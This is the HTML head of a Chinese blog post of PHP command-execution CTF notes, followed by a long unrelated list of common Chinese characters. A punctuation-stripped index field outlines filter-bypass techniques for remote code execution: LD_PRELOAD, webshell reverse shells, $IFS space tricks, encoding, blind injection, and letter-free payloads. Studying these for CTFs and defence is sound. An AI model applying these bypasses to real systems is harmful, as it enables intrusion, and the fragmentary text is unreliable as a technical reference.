<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>php命令执行 | 永远自由如风 永远为自己着迷</title><meta name="keywords" content="phptop10,橙子科技"><meta name="author" content="达达"><meta name="copyright" content="达达"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="php命令执行"><meta name="application-name" content="php命令执行"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="php命令执行"><meta property="og:url" content="http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"><meta property="og:site_name" content="永远自由如风 永远为自己着迷"><meta property="og:description" content="0x01命令执行函数介绍常见函数 system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec system  有回显system(string $command,int &amp;amp;$return_var &amp;amp;"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250809165008358.gif"><meta property="article:author" content="达达"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250809165008358.gif"><meta name="description" content="0x01命令执行函数介绍常见函数 system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec system  有回显system(string $command,int &amp;amp;$return_var &amp;amp;"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723094953412.jpg"><link rel="canonical" href="http://dada-06.github.io/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"与其等风来 不如追风去","backTitle":"人生是旷野 不是轨道"},
  LA51: undefined,
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:{"enable":true,"maxBarrage":1,"barrageTime":8000,"accessToken":"","mailMd5":""},
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: 达达","link":"链接: ","source":"来源: 永远自由如风 永远为自己着迷","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '永远自由如风 永远为自己着迷',
  title: 'php命令执行',
  postAI: '',
  pageFillDescription: '0x01命令执行函数介绍, system  有回显, exec  回显最后一行, passthru   有回显, shell_exec  无回显, popen  无回显, command, proc_open  无回显, 0x02替换绕过函数过滤(过), 0x03LD_PRELOAD绕过, 0x04mail()函数命令, 0x05蚁剑及pcntl绕过函数过滤, antsword, pcntl_exec, 0x06操作系统链接符, , amp   URL编码  %26, |, ||, 0x07.空格过滤绕过, 1.大括号{catflag.txt}, 2.$IFS代替空格；$IFS、${IFS}、$IFS$9, 3.重定向字符 lt ltgt, 4.%09(Tab)%20(space), 0x08.文件名过滤绕过, 1.通配符  ?  * 绕过, 2.单引号、双引号绕过, 3.反斜杠  \   绕过, 4.特殊变量  $1到$9、$@和$*等, 5.内联执行, 6.利用linux中的环境变量, 0x09.常见文件读取目录绕过, 1.tac：反向显示, 2.more一页一页的显示档案内容, 3.less：与more类似, 4.tail：查看末尾几行；, 5.nl：显示的时候顺便输出行号, 6.od：以二进制的方式读取档案内容；, 7.xxd：读取二进制文件, 8.sort：主要用于排序文件；, 9.uniq：报告或删除文件中重复的行；, 10.file -f 报错出具体内容, 0x10.编码绕过, 1.base64编码, 2.base32编码, 3.HEX编码, 4.shellcode编码, 0x11无回显时间盲注, 命令盲注, 相关命令, 1.sleep, 2.awk NR, 3.cut -c, 4.if语句, 0x12长度过滤绕过前置知识, gt符号和 gtgt符号, 命令换行, ls -t命令, sh, 组合运用, dir及 *和rev, 0x13长度为7绕过方法, 0x14长度为5, 0x15长度为4, 0x16无参数命令执行, HTTP请求头绕过(php7.3), 0x17无参数全局变量RCE(php5x2F7), 0x18无参数session RCE, 利用session(php5), AAA偷渡阴平（复仇）与本靶场的比较, 0x19无参数scandir读取, 当前目录, scandir(), getcwd, 上级目录, 根目录, nss  Boring Code, 获得  ., 1, 切换目录层级, 构造根目录路径, PHP5, PHP7, 0x21无字母数字取反绕过, PHP5, PHP7, 0x22无字母数字自增绕过, PHP5, PHP7, 0x23无字母数字特殊符号过滤(php7), 无字母数字下划线, 无字母数字下划线及$符号过滤, PHP7, PHP5, 无字母数字过滤~^96amp|, 无字母数字  只获得数字？命令执行函数介绍常见函数反引号有回显常用参数执行参数所指定的目录并且输出执行结果如果提供参数则外部命令执行后的返回状态将会被设置到此变量中回显最后一行字符串数组执行给定的参数将要执行的命令如果存在该参数则指定的数组将填充命令尾随空格如不是包含在此数组中请注意如果数组已经包含一些元素中将附加到数组的末尾如果你不希望函数附加元素请在将数组传递给之前对数组调用如果存在参数以及参数则返回已执行命令的状态将写入此变量有回显字符串假函数与函数类似因为它都执行一个此功能当命令的输出时应该使用或是二进制数据需要直接传递回浏览器此作的常见用途是执行类似于实用程序由将设置为和然后调用程序输出一个可以创建直接输出图像的脚本参数将要执行的命令如果存在该参数则返回状态将放在命令的此处无回显字符串字符串错误零参数将要执行的命令返回值一个包含已执行命令输出的字符串如果管道或如果发生错误或命令未生成任何输出注意此函数可以在发生错误时返回也可以返回程序不产生任何输出无法使用这个函数在访问程序退出代码是必需的使用等输出结果无回显字符串字符串资源假参数命令模式要么用于阅读要么用于写作在上默认为文本模式即写入管道或从管道读取的任何字符都将被转换为如果不需要可以通过分别设置为和来强制执行二进制模式返回值返回与返回的文件指针相同的文件指针不同之处在于它是单向的可能是仅用于读取或写入并且必须用关闭此指针可以与和一起使用当模式为时返回的指针等于命令的当模式是则返回的文件指针等于命令如果发生错误则返回获取内容输出内容无回显数组字符串数组数组字符串空数组空数组假类似于但对程序执行的控制程度要大得多参数要作为字符串执行的命令行特殊字符必须正确转义并且必须应用适当的引用一个索引数组其中表示描述符编号表示如何将该描述符传递给过程是是而是每个元素可以是描述要传递给进程的管道的数组第一个元素是描述符类型第二个元素是给定的类型有效类型包括第二个元素是将的读取端传递给进程或传递写入端和第二个元素是文件名请注意其他任何内容都被视为表示真实文件描述符的流资源例如打开的文件套接字文件描述符编号不限于和您可以指定任何有效的文件描述符编号它将被传递给子进程这允许您的脚本与其他作为运行的脚本特别是这对于将密码短语传递给和等程序安全的方式它对于读取状态信息也很有用由这些程序在辅助文件描述符上提供将设置为对应于创建的任何管道的末尾命令的初始工作目录这必须是绝对目录路径如果您想使用默认值当前进程一个数组其中包含命令的环境变量该命令将是或使用与当前进程相同的环境允许您指定其他选项当前支持的选项包括仅限禁止显示错误由此函数在设置为时生成仅限设置为时绕过仅限强制设置为时阻塞管道仅限允许设置为时处理事件的子进程仅限新流程具有新的控制台而不是继承其父级的控制台返回值返回表示进程的资源完成后应使用释放该资源失败时返回字符串数组数组布尔值使用给定的参数执行程序参数必须是二进制可执行文件的路径或者是脚本其有效路径指向作为第一行查看系统的页面了解更多信息是传递给程序是一个字符串数组这些字符串以环境添加到程序中数组的格式为键是环境变量的名称值是该变量的值返回值返回替换绕过函数过滤过绕过函数命令这个题就是写一个文件文件用生成文件将和文件一起通过蚁剑上传这里是留着后门的上传成功开启服务器监听然后去访问网页监听成功下面这是给的第二种方法蚁剑及绕过函数过滤这里还是上面那个题通过蚁剑插件来解题或者函数反弹成功操作系统链接符使多个命令按顺序执行前面的命令和后面的命令都会执行编码使命令在后台运行这样就可以同时执行多条命令第一条命令无法执行成功则后面的命令也无法执行执行的时候要进行一下编码不然后面的命令无法执行将前面的命令的输出作为后面命令的输入把前面命令的结果当成后面命令的参数前面的命令和后面的命令都会执行但只显示后面的命令执行结果类似于程序中的语句若前面的命令执行成功则后面的命令就不会执行若前面的命令执行失败则执行后面的命令空格过滤绕过大括号代替空格下有一个特殊的环境变量叫做叫做内部字段分隔符单纯被解释器当做变量名输不出来结果加一个就固定了变量名后面加个与类似起截断作用是当前系统进程第九个参数持有者始终为空字符串重定向字符表示的是输入重定向的意思就是把后面跟的文件取代键盘作为新的输入设备文件名过滤绕过通配符绕过通配符是一种特殊语句主要有和用来模糊搜索文件在里面可以进行代替字母仅代表单个字符串但此单子必须存在在里面可以进行模糊匹配可以代表任何字符串多个匹配结果同时展示单引号双引号绕过代表空字符即单引号与双引号会被解析为空字符会被解析为但可以绕过与的过滤并执行命令反斜杠绕过把特殊字符去掉功能性单纯表示为字符串会把存入到文件里则会把直接输出出来所以有反斜杠绕过特殊变量到和等输出为空空字符内联执行自定义字符串再拼接起来就表示利用中的环境变量使用环境变量里的字符执行命令默认系统环境变量就是从第五个字符开始往后取一个字符即这里要从开始数常见文件读取目录绕过反向显示与功能类似但是是反向显示从最后一行往前开始显示一页一页的显示档案内容与类似查看末尾几行可以看到他是从开始的显示了行即末尾行显示的时候顺便输出行号以二进制的方式读取档案内容这是以进制的格式输出的会把进制转换为吗字符读取二进制文件主要用于排序文件可以发现他把和排前面去了在里有时会通过执行报告或删除文件中重复的行可以看到只输出了一次报错出具体内容可以看到一些的报错把内容给显示出来了在文本中查找指定字符串从文本文件中搜索包含字符串的行并显示编码绕过编码编码把前面指令执行的结果变成后面指令的参数上面意思就是的结果为然后变成这里对解码成为执行命令把放在里执行里可以成功执行命令还可以用等编码编码码二进制显示和处理文件工具将纯十六进制转储的反向输出打印为了格式反引号执行命令等编码进制的机器码反引号这里用的话可能无法正常执行命令这个会自动解码不需要输入解码的命令无回显时间盲注命令盲注页面无法反弹或者无法回显或者没有写入权限可尝试命令盲注根据返回的时间来进行判断读取文件指定行的指定位置的字符判断语句相关命令秒之后返回结果逐行获取数据命令逐列获取单个字符语句判断命令是否执行里的判断语句为真则执行否则执行结束里判断语句为真则执行休眠秒后返回结果盲注脚本查看根目录来获取文件名改成自己的地址长度过滤绕过前置知识符号和符号通过来创建文件创建文件并把字符串写入到文件里通过来将命令执行结果写入文件会覆盖掉文件原本的内容直接创建文件类似通过追加内容命令换行在没有写完的命令后面加可以将一条命令写在多行相当于把换行的命令连接到一起执行命令将文件名按照时间顺序排列出来后创建的排在前面即离我现在输入命令时间最近的在前面只能精确到秒是按字母顺序显示文件名先符号后数字再字符命令是命令语言解释器执行命令从标准输入读取或从一个文件中读取组合运用创建文件并把执行结果写入到文件里命令列出文件名然后每个文件名按行储存对命令有长度限制时把一些很短的文件名拼接成可执行命令创建很短的文件名按时间顺序列出文件名按行存储连接换行命令从文件中读取命令及和基本上和一样但有两个好处一是开头字母是这使得它在序中靠前二是按列输出不换行相当于如果第一个文件名是命令的话就会执行命令返回执行的结果之后的文件名作为参数传入可以反转文件每一行内容长度为绕过方法期望执行命令自己服务器的监听端口展示内容再通过反弹提交到自己服务器长度为长度为无参数命令执行只要里匹配到则替换为空正则表达式匹配字母数字下划线匹配到形式的字符串但是内不能出现任何参数代表递归即都能匹配到格式的字符串能被替换为空被替换为空则匹配则调用执行被替换为空则请求头绕过获取所有请求标头读取头部信息倒叙排列写这个题记得要换到的环境的环境这些函数应该还不能用把第一项的值显示出来把最后一项的值显示出来功能与相似适用于服务器可以利用进行反弹无参数全局变量全局变量返回所有已定义变量的值所组成的数组返回数组顺序为是中的一个超级全局变量准确地说是它用于处理通过方法上传的文件当你使用上传文件时你表单中形如当用户提交这个表单并上传文件后会自动将上传的文件信息存放在数组中的结构示例字段说明上传文件的原始名称类型临时文件在服务器上的路径存储在的临时目录中错误代码表示上传成功文件大小单位字节把换成即可执行命令无参数利用启动新会话或者重用现有会话成功开始会返回反之返回返回的值可以使用修改的值修改为用修改的值为用读取文件源代码修改外部函数修改的值为命令无法直接执行因为的值里不能一些有特殊符号先把命令编码转为十六进制写入再用函数将十六进制转换为二进制原始数据用执行但是里有一道题偷渡阴平复仇的用法不一样复现平台在偷渡阴平复仇与本靶场的比较这个是上面靶场的题执行是没有正常执行的这是的题执行是正常执行的而上面靶场的题执行这个是可以成功执行的的题不可以然后在上面靶场的环境下试了一下的仍然没有反应当然这个靶场里原来环境里可以用的也不可以用具体不知道是什么环境问题无参数读取利用进行文件读取只能进行文件读取当前目录类似在某文件路径下把内容以列表形式显示出来列出指定路径中的文件和目录取得当前工作目录返回数组中的第一项的值返回单元顺序相反的数组交换数组中的键和值将数组中的内部指针向前移动其实就是到了数组里的下一个键和值从数组中随机取出一个或多个随机键系统调用函数同用于改变当前工作目录用于反转给定的字符串用来加密目前平台上加密的方法大致有把希伯来文本从右至左的流转换为从左至右的流查看当前目录文件名显示的数组第一项为功能同读取当前目录下所有文件名倒序读取当前目录文件查看和读取当前目录文件当前目录上级目录查看上一级目录文件名当前目录上一级目录查看上一级目录文件名效果相同因为第二个元素是也是上级目录的意思读取上一级目录文件名这会随机读取上一级目录中的一个文件的内容根目录序列化末尾可能出现单向字符串散列加密结果随机反转让开头可能出现倒序函数和函数只能对第一个字符进行转码编码解码把单个字符变成码点整数在下面这里他只能取第一个字符把整数变成对应的字符所以就有可能通过将编码再通过解码来得到列出根目录中的文件和目录查看根目录文件名最后通过反转键和键值随机读取键展示源码这里还得拿把目录固定一下取上级目录取目录的父级这个就是里的内容这里也可以通过的模块进行爆破无限发包访问获得切换目录层级将工作目录切换到上级目录路径向上跳一层构造根目录路径获取当前时间戳如解析为时间数组秒分时取第一个元素秒数范围将秒数转为字符若秒数根目录符号扫描根目录文件列出根目录所有文件如获取目标文件取数组最后一个元素假设存在文件常见设计读取文件内容直接输出文件内容第一阶段通过发现了一个函数函数把整个文件读入一个数组中与类似不同的是将文件作为一个数组返回数组中的每个单元都是文件中相应的一行包括换行符在内如果失败则返回既然是一个数组我们可以用序列化函数来转成一个字符串呢么读取的无参数函数就有了第二阶段最重要的是的获取但是和都被了该怎么获得呢当时比赛的时候确实没有出来搜到了一下大佬的骚姿势链接会放在文章下方利用返回一个加密的字符串加密的字符串末尾有几率出现一个总共末尾会出现四种情况再通过反转字符将反转到第一位可以通过取到第一位再通过转化为会取字符串中的第一位转化为码第三层其实这里我做了不必要的函数吃掉放进中通过实践发现根本无需在中加入直接吃掉即可只需要里面的是一个字符串返回的值也是字符串缩短后的本地测试完全可以获取请求需要多试很多次有的纪律会获得尝试几次就出来了获得的骚姿势截取自大佬总结的博客函数我更愿意归结于函数而不是即便你知道函数通过复杂的运算你还是需要核心思路是函数会返回当前的版本好然后可以用函数取第一位的数值固定为返回不大于的下一个整数简单的说就是向下取整有了数字就可以通过各种数学运算拿到数字也就是字符返回一个数字的平方根返回一个数字的正切返回一个数字的双曲余弦返回一个数字的双曲正弦返回不小于一个数字的下一个整数也就是向上取整经过上面这些步骤能拿到数字再通过函数就可以返回编码为的字符也就为后面的步骤就和之前一样跳转到根目录然后读取文件函数同函数首先定义一个数组然后对其进行序列化操作输出序列化字符串这里没什么问题然后就用到一个非常关键的函数返回一个基于标准算法或系统上其他可用的替代算法的散列字符串说起来很复杂你仅需要知道它可以返回一个加密字符串多次尝试后发现会出现在加密字符串的末尾加密字符串的开头默认为然后我才想到不能用但可以用啊真的太菜了再转化为最近又看到一个函数把希伯来文本从右至左的流转换为左至右的流其实也是的特性只是都是反转而已以上获取的两个骚姿势截取自于下面的大佬博客对于此题的总结上海赛的第二题是月安恒杯的一道原题官方解是双重编码绕过通过结合完成污染从而包含日志进行大佬的解不同的是将邮件正常发给的话正好可读通过包含的邮件完成包含一句话进行无字母数字异或运算绕过异或运算异或运算第一部分异或运算第二部分异或结果需要加个转义字符异或结果提交服务器端口号进行反弹无字母数字取反绕过一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋